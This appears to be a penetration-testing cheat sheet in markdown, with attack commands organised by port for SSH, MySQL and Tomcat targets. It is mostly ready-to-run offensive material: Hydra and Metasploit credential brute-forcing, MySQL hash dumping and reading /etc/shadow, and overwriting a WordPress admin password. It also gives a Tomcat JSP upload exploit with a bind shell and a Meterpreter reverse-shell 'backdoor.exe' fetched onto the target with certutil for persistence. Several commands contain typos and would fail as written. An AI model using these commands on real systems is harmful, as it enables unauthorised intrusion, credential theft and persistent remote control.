# Windows - Enum/Exploitation

## 22 - OpenSSH

<pre><code># CHECK THE VERSION
<strong>searchsploit openssh VERSION
</strong></code></pre>

<pre class="language-bash" data-full-width="false"><code class="lang-bash"><strong># Nmap enum
</strong>nmap -sV -sC -p 22 IP

# Search exploit for current version
searchspoilt OpenSSH 7.1

# Hydra SSH Brute-forcing
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh -I
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh -I
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt IP ssh -I

# SSH connection with creds
ssh USER@IP
PASS

</code></pre>

{% code title="Metasploit SSH enumeration" %}
```bash
service postgresql start && msfconsole

search type:auxiliary name:ssh

use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers
use auxiliary/scanner/ssh/ssh_login

set RHOSTS IP
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```
{% endcode %}





## 80/443 - HTTP/S

{% content-ref url="../web/" %}
[web](../web/)
{% endcontent-ref %}



## 389 - LDAP

{% content-ref url="../../../active-directory-pt/ad-enumeration/ldap.md" %}
[ldap.md](../../../active-directory-pt/ad-enumeration/ldap.md)
{% endcontent-ref %}





## 445  - SMB

{% content-ref url="port-445-smb.md" %}
[port-445-smb.md](port-445-smb.md)
{% endcontent-ref %}



## 1433 - MSSQL Database

{% content-ref url="port-1433-mssql.md" %}
[port-1433-mssql.md](port-1433-mssql.md)
{% endcontent-ref %}



## 3306 - MySQL Database

```
# CHECK THE VERSION
searchsploit mysql VERSION
```

```bash
# Nmap
nmap -sC -sV -p 3306 IP
nmap --script=mysql-empty-password -p 3306 IP
nmap --script=mysql-info -p 3306 IP

# w/ creds
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 IP
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 IP
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 IP
nmap --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 IP
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 IP
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 IP

# Search exploit for current version
searchspoilt MySQL 5.5
```

### DB connection

<pre class="language-bash"><code class="lang-bash"><strong># MySQL connection
</strong>mysql -u USER -p PASS -h IP

# MySQL commands
show databases;
use DB_NAME;
show tables;
select * from TABLE_NAME
select load_file("/etc/shadow");

# Database creds location
## Server php
PATH/TO/wp-config.php
</code></pre>

```bash
# Hydra MySQL Brute-forcing
hydra -l USER -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql
```



{% code title="Metasploit" %}
```bash
## Start msfconsole
service postgresql start && msfconsole

# ENUM MySQL Modules
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login

## set options depends on the selected module
set USERNAME root
set PASSWORD ""

set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE false
set PASSWORD ""

set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""

set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true

set CMD whoami
exploit
```
{% endcode %}

{% code title="Explotation" %}
```bash
# once we are in a db
# search user table
show databases;
use wordpress; # use speific db
show tables; # view tables
select * from wp_users; # print table data

# look the format of password (md5, sha256, ...)
# update password of admin user
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';


```
{% endcode %}





## 8080

```
# CHECK THE VERSION
searchsploit SERVICE VERSION
```

### Apache Tomcat 8.5.19

```bash
service postgresql start && msconsole

use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOST
set payload java/jsp_shell_bind_tcp
set SHELL cmd
run
```

#### Persistence payload

```bash
# create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe

# transfer payload
python -m SimpleHTTP 80 # attack machine
certutil -urlcache -f http://IP_ATT/backdoor.exe backdoor.exe # target machine

# set handler
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
run

# execute payload on target machine
.\backdoor.exe
```
